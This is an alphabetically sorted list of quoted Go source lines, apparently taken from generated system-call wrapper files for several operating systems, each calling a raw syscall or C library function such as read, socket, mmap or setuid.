"r0, _, e1 := syscall.Syscall6(procSetupDiOpenDevRegKey.Addr(), 6, uintptr(deviceInfoSet), uintptr(unsafe.Pointer(deviceInfoData)), uintptr(Scope), uintptr(HwProfile), uintptr(KeyType), uintptr(samDesired))"
"r0, _, e1 := syscall.Syscall6(procVirtualAlloc.Addr(), 4, uintptr(address), uintptr(size), uintptr(alloctype), uintptr(protect), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procWSASocketW.Addr(), 6, uintptr(af), uintptr(typ), uintptr(protocol), uintptr(unsafe.Pointer(protoInfo)), uintptr(group), uintptr(flags))"
"r0, _, e1 := syscall.Syscall6(procWaitForMultipleObjects.Addr(), 4, uintptr(count), uintptr(handles), uintptr(_p0), uintptr(waitMilliseconds), 0, 0)"
"r0, _, e1 := syscall.Syscall6(procrecvfrom.Addr(), 6, uintptr(s), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"r0, _, e1 := syscall.Syscall9(procCreateFileW.Addr(), 7, uintptr(unsafe.Pointer(name)), uintptr(access), uintptr(mode), uintptr(unsafe.Pointer(sa)), uintptr(createmode), uintptr(attrs), uintptr(templatefile), 0, 0)"
"r0, _, e1 := syscall.Syscall9(procCreateNamedPipeW.Addr(), 8, uintptr(unsafe.Pointer(name)), uintptr(flags), uintptr(pipeMode), uintptr(maxInstances), uintptr(outSize), uintptr(inSize), uintptr(defaultTimeout), uintptr(unsafe.Pointer(sa)), 0)"
"r0, _, e1 := syscall.Syscall9(procFormatMessageW.Addr(), 7, uintptr(flags), uintptr(msgsrc), uintptr(msgid), uintptr(langid), uintptr(unsafe.Pointer(_p0)), uintptr(len(buf)), uintptr(unsafe.Pointer(args)), 0, 0)"
"r0, _, e1 := syscall.Syscall9(procSetupDiGetClassDevsExW.Addr(), 7, uintptr(unsafe.Pointer(classGUID)), uintptr(unsafe.Pointer(Enumerator)), uintptr(hwndParent), uintptr(Flags), uintptr(deviceInfoSet), uintptr(unsafe.Pointer(machineName)), uintptr(reserved), 0, 0)"
"r0, _, e1 := syscall_rawSyscall(libc_getgroups_trampoline_addr, uintptr(ngid), uintptr(unsafe.Pointer(gid)), 0)"
"r0, _, e1 := syscall_rawSyscall(libc_getpgid_trampoline_addr, uintptr(pid), 0, 0)"
"r0, _, e1 := syscall_rawSyscall(libc_getsid_trampoline_addr, uintptr(pid), 0, 0)"
"r0, _, e1 := syscall_rawSyscall(libc_setsid_trampoline_addr, 0, 0, 0)"
"r0, _, e1 := syscall_rawSyscall(libc_socket_trampoline_addr, uintptr(domain), uintptr(typ), uintptr(proto))"
"r0, _, e1 := syscall_rawsyscall(SYS_GETGROUPS, uintptr(n), uintptr(unsafe.Pointer(list)), 0)"
"r0, _, e1 := syscall_rawsyscall(SYS_GETPGID, uintptr(pid), 0, 0)"
"r0, _, e1 := syscall_rawsyscall(SYS_GETSID, uintptr(pid), 0, 0)"
"r0, _, e1 := syscall_rawsyscall(SYS_SETSID, 0, 0, 0)"
"r0, _, e1 := syscall_rawsyscall(SYS_SOCKET, uintptr(domain), uintptr(typ), uintptr(proto))"
"r0, _, e1 := syscall_syscall(SYS_DUP, uintptr(oldfd), 0, 0)"
"r0, _, e1 := syscall_syscall(SYS_FCNTL, uintptr(fd), uintptr(cmd), uintptr(arg))"
"r0, _, e1 := syscall_syscall(SYS_GETPRIORITY, uintptr(which), uintptr(who), 0)"
"r0, _, e1 := syscall_syscall(SYS_LSEEK, uintptr(fd), uintptr(offset), uintptr(whence))"
"r0, _, e1 := syscall_syscall(SYS_POLL, uintptr(_p0), uintptr(len(fds)), uintptr(timeout))"
"r0, _, e1 := syscall_syscall(SYS_READ, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := syscall_syscall(SYS_READ, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf))"
"r0, _, e1 := syscall_syscall(SYS_TIMES, uintptr(unsafe.Pointer(tms)), 0, 0)"
"r0, _, e1 := syscall_syscall(SYS_WAITPID, uintptr(pid), uintptr(unsafe.Pointer(wstatus)), uintptr(options))"
"r0, _, e1 := syscall_syscall(SYS_WRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := syscall_syscall(SYS_W_GETMNTENT, uintptr(unsafe.Pointer(buff)), uintptr(size), 0)"
"r0, _, e1 := syscall_syscall(SYS___ACCEPT_A, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r0, _, e1 := syscall_syscall(SYS___CREAT_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), 0)"
"r0, _, e1 := syscall_syscall(SYS___OPEN_A, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm))"
"r0, _, e1 := syscall_syscall(SYS___PTSNAME_A, uintptr(fd), 0, 0)"
"r0, _, e1 := syscall_syscall(SYS___READLINK_A, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(buf)))"
"r0, _, e1 := syscall_syscall(SYS___RECVMSG_A, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := syscall_syscall(SYS___SENDMSG_A, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := syscall_syscall(SYS___W_GETMNTENT_A, uintptr(unsafe.Pointer(buff)), uintptr(size), 0)"
"r0, _, e1 := syscall_syscall(libc_accept_trampoline_addr, uintptr(s), uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r0, _, e1 := syscall_syscall(libc_dup_trampoline_addr, uintptr(fd), 0, 0)"
"r0, _, e1 := syscall_syscall(libc_fcntl_trampoline_addr, uintptr(fd), uintptr(cmd), uintptr(arg))"
"r0, _, e1 := syscall_syscall(libc_fpathconf_trampoline_addr, uintptr(fd), uintptr(name), 0)"
"r0, _, e1 := syscall_syscall(libc_getcwd_trampoline_addr, uintptr(_p0), uintptr(len(buf)), 0)"
"r0, _, e1 := syscall_syscall(libc_getfsstat64_trampoline_addr, uintptr(buf), uintptr(size), uintptr(flags))"
"r0, _, e1 := syscall_syscall(libc_getfsstat_trampoline_addr, uintptr(buf), uintptr(size), uintptr(flags))"
"r0, _, e1 := syscall_syscall(libc_getpriority_trampoline_addr, uintptr(which), uintptr(who), 0)"
"r0, _, e1 := syscall_syscall(libc_kqueue_trampoline_addr, 0, 0, 0)"
"r0, _, e1 := syscall_syscall(libc_lseek_trampoline_addr, uintptr(fd), uintptr(offset), uintptr(whence))"
"r0, _, e1 := syscall_syscall(libc_open_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm))"
"r0, _, e1 := syscall_syscall(libc_pathconf_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(name), 0)"
"r0, _, e1 := syscall_syscall(libc_poll_trampoline_addr, uintptr(unsafe.Pointer(fds)), uintptr(nfds), uintptr(timeout))"
"r0, _, e1 := syscall_syscall(libc_read_trampoline_addr, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := syscall_syscall(libc_read_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf))"
"r0, _, e1 := syscall_syscall(libc_readlink_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(buf)))"
"r0, _, e1 := syscall_syscall(libc_recvmsg_trampoline_addr, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := syscall_syscall(libc_sendmsg_trampoline_addr, uintptr(s), uintptr(unsafe.Pointer(msg)), uintptr(flags))"
"r0, _, e1 := syscall_syscall(libc_shmat_trampoline_addr, uintptr(id), uintptr(addr), uintptr(flag))"
"r0, _, e1 := syscall_syscall(libc_shmctl_trampoline_addr, uintptr(id), uintptr(cmd), uintptr(unsafe.Pointer(buf)))"
"r0, _, e1 := syscall_syscall(libc_shmget_trampoline_addr, uintptr(key), uintptr(size), uintptr(flag))"
"r0, _, e1 := syscall_syscall(libc_write_trampoline_addr, uintptr(fd), uintptr(_p0), uintptr(len(p)))"
"r0, _, e1 := syscall_syscall(libc_write_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(buf)), uintptr(nbuf))"
"r0, _, e1 := syscall_syscall6(SYS_MMAP, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), uintptr(pos))"
"r0, _, e1 := syscall_syscall6(SYS_PREAD, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := syscall_syscall6(SYS_PWRITE, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := syscall_syscall6(SYS_SELECT, uintptr(nmsgsfds), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), 0)"
"r0, _, e1 := syscall_syscall6(SYS___RECVFROM_A, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"r0, _, e1 := syscall_syscall6(libc_fgetxattr_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(dest)), uintptr(size), uintptr(position), uintptr(options))"
"r0, _, e1 := syscall_syscall6(libc_flistxattr_trampoline_addr, uintptr(fd), uintptr(unsafe.Pointer(dest)), uintptr(size), uintptr(options), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_getxattr_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), uintptr(unsafe.Pointer(dest)), uintptr(size), uintptr(position), uintptr(options))"
"r0, _, e1 := syscall_syscall6(libc_kevent_trampoline_addr, uintptr(kq), uintptr(change), uintptr(nchange), uintptr(event), uintptr(nevent), uintptr(unsafe.Pointer(timeout)))"
"r0, _, e1 := syscall_syscall6(libc_listxattr_trampoline_addr, uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(dest)), uintptr(size), uintptr(options), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_mmap_trampoline_addr, uintptr(addr), uintptr(length), uintptr(prot), uintptr(flag), uintptr(fd), uintptr(pos))"
"r0, _, e1 := syscall_syscall6(libc_openat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(mode), uintptr(perm), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_pread_trampoline_addr, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_pwrite_trampoline_addr, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(offset), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_readlinkat_trampoline_addr, uintptr(dirfd), uintptr(unsafe.Pointer(_p0)), uintptr(_p1), uintptr(len(buf)), 0, 0)"
"r0, _, e1 := syscall_syscall6(libc_recvfrom_trampoline_addr, uintptr(fd), uintptr(_p0), uintptr(len(p)), uintptr(flags), uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"r0, _, e1 := syscall_syscall6(libc_select_trampoline_addr, uintptr(nfd), uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), 0)"
"r0, _, e1 := syscall_syscall6(libc_wait4_trampoline_addr, uintptr(pid), uintptr(unsafe.Pointer(wstatus)), uintptr(options), uintptr(unsafe.Pointer(rusage)), 0, 0)"
"r0, _, e1 := syscall_syscallPtr(libc_fdopendir_trampoline_addr, uintptr(fd), 0, 0)"
"r0, _, e1 := sysvicall6(uintptr(unsafe.Pointer("
"r0, e1 := callaccept(s, uintptr(unsafe.Pointer(rsa)), uintptr(unsafe.Pointer(addrlen)))"
"r0, e1 := calldup(oldfd)"
"r0, e1 := callfcntl(fd, cmd, uintptr(arg))"
"r0, e1 := callfcntl(uintptr(fd), cmd, uintptr(arg))"
"r0, e1 := callgetdirent(fd, uintptr(unsafe.Pointer(_p0)), len(buf))"
"r0, e1 := callgetgroups(n, uintptr(unsafe.Pointer(list)))"
"r0, e1 := callgetpgid(pid)"
"r0, e1 := callgetpriority(which, who)"
"r0, e1 := callgetsid(pid)"
"r0, e1 := calllseek(fd, offset, whence)"
"r0, e1 := callmmap64(addr, length, prot, flags, fd, offset)"
"r0, e1 := callnrecvmsg(s, uintptr(unsafe.Pointer(msg)), flags)"
"r0, e1 := callnsendmsg(s, uintptr(unsafe.Pointer(msg)), flags)"
"r0, e1 := callopen64(uintptr(unsafe.Pointer(_p0)), mode, perm)"
"r0, e1 := callopenat(dirfd, uintptr(unsafe.Pointer(_p0)), flags, mode)"
"r0, e1 := callpoll(uintptr(unsafe.Pointer(fds)), nfds, timeout)"
"r0, e1 := callpread64(fd, uintptr(unsafe.Pointer(_p0)), len(p), offset)"
"r0, e1 := callpselect(nfd, uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)), uintptr(unsafe.Pointer(sigmask)))"
"r0, e1 := callpwrite64(fd, uintptr(unsafe.Pointer(_p0)), len(p), offset)"
"r0, e1 := callread(fd, uintptr(unsafe.Pointer(_p0)), len(p))"
"r0, e1 := callread(fd, uintptr(unsafe.Pointer(p)), np)"
"r0, e1 := callreadlink(uintptr(unsafe.Pointer(_p0)), uintptr(unsafe.Pointer(_p1)), len(buf))"
"r0, e1 := callrecvfrom(fd, uintptr(unsafe.Pointer(_p0)), len(p), flags, uintptr(unsafe.Pointer(from)), uintptr(unsafe.Pointer(fromlen)))"
"r0, e1 := callselect(nfd, uintptr(unsafe.Pointer(r)), uintptr(unsafe.Pointer(w)), uintptr(unsafe.Pointer(e)), uintptr(unsafe.Pointer(timeout)))"
"r0, e1 := callsetsid()"
"r0, e1 := callsocket(domain, typ, proto)"
"r0, e1 := callsplice(rfd, uintptr(unsafe.Pointer(roff)), wfd, uintptr(unsafe.Pointer(woff)), len, flags)"
"r0, e1 := callsyslog(typ, uintptr(unsafe.Pointer(_p0)), len(buf))"
"r0, e1 := calltime(uintptr(unsafe.Pointer(t)))"
"r0, e1 := calltimes(uintptr(unsafe.Pointer(tms)))"
"r0, e1 := callwait4(int(pid), uintptr(unsafe.Pointer(status)), options, uintptr(unsafe.Pointer(rusage)))"
"r0, e1 := callwrite(fd, uintptr(unsafe.Pointer(_p0)), len(p))"
"r0, e1 := callwrite(fd, uintptr(unsafe.Pointer(p)), np)"
"r0, er := C.accept(C.int(s), C.uintptr_t(uintptr(unsafe.Pointer(rsa))), C.uintptr_t(uintptr(unsafe.Pointer(addrlen))))"
"r0, er := C.acct(C.uintptr_t(_p0))"
"r0, er := C.bind(C.int(s), C.uintptr_t(uintptr(addr)), C.uintptr_t(uintptr(addrlen)))"
"r0, er := C.c_select(C.int(nfd), C.uintptr_t(uintptr(unsafe.Pointer(r))), C.uintptr_t(uintptr(unsafe.Pointer(w))), C.uintptr_t(uintptr(unsafe.Pointer(e))), C.uintptr_t(uintptr(unsafe.Pointer(timeout))))"
"r0, er := C.chdir(C.uintptr_t(_p0))"
"r0, er := C.chroot(C.uintptr_t(_p0))"
"r0, er := C.close(C.int(fd))"
"r0, er := C.connect(C.int(s), C.uintptr_t(uintptr(addr)), C.uintptr_t(uintptr(addrlen)))"
"r0, er := C.dup(C.int(oldfd))"
"r0, er := C.dup2(C.int(oldfd), C.int(newfd))"
"r0, er := C.faccessat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(flags))"
"r0, er := C.fchdir(C.int(fd))"
"r0, er := C.fchmod(C.int(fd), C.uint(mode))"
"r0, er := C.fchmodat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(flags))"
"r0, er := C.fchown(C.int(fd), C.int(uid), C.int(gid))"
"r0, er := C.fchownat(C.int(dirfd), C.uintptr_t(_p0), C.int(uid), C.int(gid), C.int(flags))"
"r0, er := C.fcntl(C.uintptr_t(fd), C.int(cmd), C.uintptr_t(arg))"
"r0, er := C.fcntl(C.uintptr_t(fd), C.int(cmd), C.uintptr_t(uintptr(unsafe.Pointer(lk))))"
"r0, er := C.fdatasync(C.int(fd))"
"r0, er := C.fstat(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(stat))))"
"r0, er := C.fstatat(C.int(dirfd), C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(stat))), C.int(flags))"
"r0, er := C.fstatfs(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(buf))))"
"r0, er := C.fsync_range(C.int(fd), C.int(how), C.longlong(start), C.longlong(length))"
"r0, er := C.ftruncate(C.int(fd), C.longlong(length))"
"r0, er := C.getcwd(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.getdirent(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.getgroups(C.int(n), C.uintptr_t(uintptr(unsafe.Pointer(list))))"
"r0, er := C.getpeername(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(rsa))), C.uintptr_t(uintptr(unsafe.Pointer(addrlen))))"
"r0, er := C.getpgid(C.int(pid))"
"r0, er := C.getpriority(C.int(which), C.int(who))"
"r0, er := C.getrlimit64(C.int(resource), C.uintptr_t(uintptr(unsafe.Pointer(rlim))))"
"r0, er := C.getrusage(C.int(who), C.uintptr_t(uintptr(unsafe.Pointer(rusage))))"
"r0, er := C.getsid(C.int(pid))"
"r0, er := C.getsockname(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(rsa))), C.uintptr_t(uintptr(unsafe.Pointer(addrlen))))"
"r0, er := C.getsockopt(C.int(s), C.int(level), C.int(name), C.uintptr_t(uintptr(val)), C.uintptr_t(uintptr(unsafe.Pointer(vallen))))"
"r0, er := C.gettimeofday(C.uintptr_t(uintptr(unsafe.Pointer(tv))), C.uintptr_t(uintptr(unsafe.Pointer(tzp))))"
"r0, er := C.ioctl(C.int(fd), C.int(req), C.uintptr_t(arg))"
"r0, er := C.kill(C.int(pid), C.int(sig))"
"r0, er := C.lchown(C.uintptr_t(_p0), C.int(uid), C.int(gid))"
"r0, er := C.listen(C.int(s), C.int(n))"
"r0, er := C.lseek64(C.int(fd), C.longlong(offset), C.int(whence))"
"r0, er := C.lstat(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(stat))))"
"r0, er := C.madvise(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.int(advice))"
"r0, er := C.mkdir(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode))"
"r0, er := C.mkdirat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode))"
"r0, er := C.mkfifo(C.uintptr_t(_p0), C.uint(mode))"
"r0, er := C.mknod(C.uintptr_t(_p0), C.uint(mode), C.int(dev))"
"r0, er := C.mknodat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(dev))"
"r0, er := C.mlock(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.mlockall(C.int(flags))"
"r0, er := C.mmap(C.uintptr_t(addr), C.uintptr_t(length), C.int(prot), C.int(flags), C.int(fd), C.longlong(offset))"
"r0, er := C.mprotect(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.int(prot))"
"r0, er := C.msync(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.int(flags))"
"r0, er := C.munlock(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.munlockall()"
"r0, er := C.munmap(C.uintptr_t(addr), C.uintptr_t(length))"
"r0, er := C.nanosleep(C.uintptr_t(uintptr(unsafe.Pointer(time))), C.uintptr_t(uintptr(unsafe.Pointer(leftover))))"
"r0, er := C.nrecvmsg(C.int(s), C.uintptr_t(uintptr(unsafe.Pointer(msg))), C.int(flags))"
"r0, er := C.nsendmsg(C.int(s), C.uintptr_t(uintptr(unsafe.Pointer(msg))), C.int(flags))"
"r0, er := C.open64(C.uintptr_t(_p0), C.int(mode), C.uint(perm))"
"r0, er := C.openat(C.int(dirfd), C.uintptr_t(_p0), C.int(flags), C.uint(mode))"
"r0, er := C.pause()"
"r0, er := C.pipe(C.uintptr_t(uintptr(unsafe.Pointer(p))))"
"r0, er := C.poll(C.uintptr_t(uintptr(unsafe.Pointer(fds))), C.int(nfds), C.int(timeout))"
"r0, er := C.posix_fadvise64(C.int(fd), C.longlong(offset), C.longlong(length), C.int(advice))"
"r0, er := C.pread64(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.longlong(offset))"
"r0, er := C.pselect(C.int(nfd), C.uintptr_t(uintptr(unsafe.Pointer(r))), C.uintptr_t(uintptr(unsafe.Pointer(w))), C.uintptr_t(uintptr(unsafe.Pointer(e))), C.uintptr_t(uintptr(unsafe.Pointer(timeout))), C.uintptr_t(uintptr(unsafe.Pointer(sigmask))))"
"r0, er := C.pwrite64(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.longlong(offset))"
"r0, er := C.read(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.read(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(p))), C.size_t(np))"
"r0, er := C.readlink(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(_p1))), C.size_t(_p2))"
"r0, er := C.recvfrom(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.int(flags), C.uintptr_t(uintptr(unsafe.Pointer(from))), C.uintptr_t(uintptr(unsafe.Pointer(fromlen))))"
"r0, er := C.renameat(C.int(olddirfd), C.uintptr_t(_p0), C.int(newdirfd), C.uintptr_t(_p1))"
"r0, er := C.sendto(C.int(s), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1), C.int(flags), C.uintptr_t(uintptr(to)), C.uintptr_t(uintptr(addrlen)))"
"r0, er := C.setdomainname(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.setgid(C.int(uid))"
"r0, er := C.setgroups(C.int(n), C.uintptr_t(uintptr(unsafe.Pointer(list))))"
"r0, er := C.sethostname(C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.setpgid(C.int(pid), C.int(pgid))"
"r0, er := C.setpriority(C.int(which), C.int(who), C.int(prio))"
"r0, er := C.setregid(C.int(rgid), C.int(egid))"
"r0, er := C.setreuid(C.int(ruid), C.int(euid))"
"r0, er := C.setrlimit64(C.int(resource), C.uintptr_t(uintptr(unsafe.Pointer(rlim))))"
"r0, er := C.setsid()"
"r0, er := C.setsockopt(C.int(s), C.int(level), C.int(name), C.uintptr_t(uintptr(val)), C.uintptr_t(vallen))"
"r0, er := C.settimeofday(C.uintptr_t(uintptr(unsafe.Pointer(tv))))"
"r0, er := C.setuid(C.int(uid))"
"r0, er := C.shutdown(C.int(fd), C.int(how))"
"r0, er := C.socket(C.int(domain), C.int(typ), C.int(proto))"
"r0, er := C.socketpair(C.int(domain), C.int(typ), C.int(proto), C.uintptr_t(uintptr(unsafe.Pointer(fd))))"
"r0, er := C.splice(C.int(rfd), C.uintptr_t(uintptr(unsafe.Pointer(roff))), C.int(wfd), C.uintptr_t(uintptr(unsafe.Pointer(woff))), C.int(len), C.int(flags))"
"r0, er := C.stat(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(statptr))))"
"r0, er := C.statfs(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(buf))))"
"r0, er := C.statx(C.int(dirfd), C.uintptr_t(_p0), C.int(flags), C.int(mask), C.uintptr_t(uintptr(unsafe.Pointer(stat))))"
"r0, er := C.syslog(C.int(typ), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.time(C.uintptr_t(uintptr(unsafe.Pointer(t))))"
"r0, er := C.times(C.uintptr_t(uintptr(unsafe.Pointer(tms))))"
"r0, er := C.truncate(C.uintptr_t(_p0), C.longlong(length))"
"r0, er := C.umount(C.uintptr_t(_p0))"
"r0, er := C.uname(C.uintptr_t(uintptr(unsafe.Pointer(buf))))"
"r0, er := C.unlink(C.uintptr_t(_p0))"
"r0, er := C.unlinkat(C.int(dirfd), C.uintptr_t(_p0), C.int(flags))"
"r0, er := C.ustat(C.int(dev), C.uintptr_t(uintptr(unsafe.Pointer(ubuf))))"
"r0, er := C.utime(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(buf))))"
"r0, er := C.utimensat(C.int(dirfd), C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(times))), C.int(flag))"
"r0, er := C.utimes(C.uintptr_t(_p0), C.uintptr_t(uintptr(unsafe.Pointer(times))))"
"r0, er := C.wait4(C.int(pid), C.uintptr_t(uintptr(unsafe.Pointer(status))), C.int(options), C.uintptr_t(uintptr(unsafe.Pointer(rusage))))"
"r0, er := C.write(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(_p0))), C.size_t(_p1))"
"r0, er := C.write(C.int(fd), C.uintptr_t(uintptr(unsafe.Pointer(p))), C.size_t(np))"
"r0, r1, e1 := RawSyscall(SYS_PIPE, 0, 0, 0)"
"r0, r1, e1 := RawSyscall(SYS_PIPE2, uintptr(unsafe.Pointer(p)), uintptr(flags), 0)"
"r0, r1, e1 := Syscall6(SYS_LSEEK, uintptr(fd), 0, uintptr(offset), uintptr(offset>>32), uintptr(whence), 0)"
"r0, r1, e1 := Syscall6(SYS_LSEEK, uintptr(fd), uintptr(offset), uintptr(offset>>32), uintptr(whence), 0, 0)"
"r0, r1, e1 := Syscall6(SYS_TEE, uintptr(rfd), uintptr(wfd), uintptr(len), uintptr(flags), 0, 0)"
"r1 = uintptr(C.accept(C.int(s), C.uintptr_t(rsa), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.bind(C.int(s), C.uintptr_t(addr), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.c_select(C.int(nfd), C.uintptr_t(r), C.uintptr_t(w), C.uintptr_t(e), C.uintptr_t(timeout)))"
"r1 = uintptr(C.connect(C.int(s), C.uintptr_t(addr), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.dup2(C.int(oldfd), C.int(newfd)))"
"r1 = uintptr(C.faccessat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(flags)))"
"r1 = uintptr(C.fchmod(C.int(fd), C.uint(mode)))"
"r1 = uintptr(C.fchmodat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode), C.int(flags)))"
"r1 = uintptr(C.fchown(C.int(fd), C.int(uid), C.int(gid)))"
"r1 = uintptr(C.fchownat(C.int(dirfd), C.uintptr_t(_p0), C.int(uid), C.int(gid), C.int(flags)))"
"r1 = uintptr(C.fcntl(C.uintptr_t(fd), C.int(cmd), C.uintptr_t(arg)))"
"r1 = uintptr(C.fstat(C.int(fd), C.uintptr_t(stat)))"
"r1 = uintptr(C.fstatat(C.int(dirfd), C.uintptr_t(_p0), C.uintptr_t(stat), C.int(flags)))"
"r1 = uintptr(C.fstatfs(C.int(fd), C.uintptr_t(buf)))"
"r1 = uintptr(C.fsync_range(C.int(fd), C.int(how), C.longlong(start), C.longlong(length)))"
"r1 = uintptr(C.ftruncate(C.int(fd), C.longlong(length)))"
"r1 = uintptr(C.getcwd(C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.getdirent(C.int(fd), C.uintptr_t(_p0), C.size_t(_lenp0)))"
"r1 = uintptr(C.getgroups(C.int(n), C.uintptr_t(list)))"
"r1 = uintptr(C.getpeername(C.int(fd), C.uintptr_t(rsa), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.getpriority(C.int(which), C.int(who)))"
"r1 = uintptr(C.getrlimit(C.int(resource), C.uintptr_t(rlim)))"
"r1 = uintptr(C.getrusage(C.int(who), C.uintptr_t(rusage)))"
"r1 = uintptr(C.getsockname(C.int(fd), C.uintptr_t(rsa), C.uintptr_t(addrlen)))"
"r1 = uintptr(C.getsockopt(C.int(s), C.int(level), C.int(name), C.uintptr_t(val), C.uintptr_t(vallen)))"
"r1 = uintptr(C.gettimeofday(C.uintptr_t(tv), C.uintptr_t(tzp)))"
"r1 = uintptr(C.ioctl(C.int(fd), C.int(req), C.uintptr_t(arg)))"
"r1 = uintptr(C.kill(C.int(pid), C.int(sig)))"
"r1 = uintptr(C.lchown(C.uintptr_t(_p0), C.int(uid), C.int(gid)))"
"r1 = uintptr(C.listen(C.int(s), C.int(n)))"
"r1 = uintptr(C.lseek(C.int(fd), C.longlong(offset), C.int(whence)))"
"r1 = uintptr(C.lstat(C.uintptr_t(_p0), C.uintptr_t(stat)))"
"r1 = uintptr(C.madvise(C.uintptr_t(_p0), C.size_t(_lenp0), C.int(advice)))"
"r1 = uintptr(C.mkdir(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode)))"
"r1 = uintptr(C.mkdirat(C.int(dirfd), C.uintptr_t(_p0), C.uint(mode)))"
"r1 = uintptr(C.mkfifo(C.uintptr_t(_p0), C.uint(mode)))"
"r1 = uintptr(C.mknod(C.uintptr_t(_p0), C.uint(mode), C.int(dev)))"
